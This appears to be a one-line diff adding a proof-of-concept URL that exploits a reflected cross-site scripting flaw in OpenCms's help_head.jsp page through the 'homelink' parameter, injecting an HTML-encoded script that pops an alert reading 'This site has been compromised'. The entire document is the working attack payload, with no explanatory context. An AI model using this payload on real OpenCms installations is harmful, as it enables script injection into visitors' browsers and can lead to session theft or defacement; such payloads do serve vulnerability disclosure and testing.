@@ -1,0 +1,1 @@
+http://www.example.com/opencms/opencms/system/modules/org.opencms.workplace.help/jsptemplates/help_head.jsp?&amp;homelink=&gt;&quot;&#039;&gt;&lt;script&gt;alert(&quot;This%20site%20has%20been%20compromised&quot;)&lt;/script&gt;
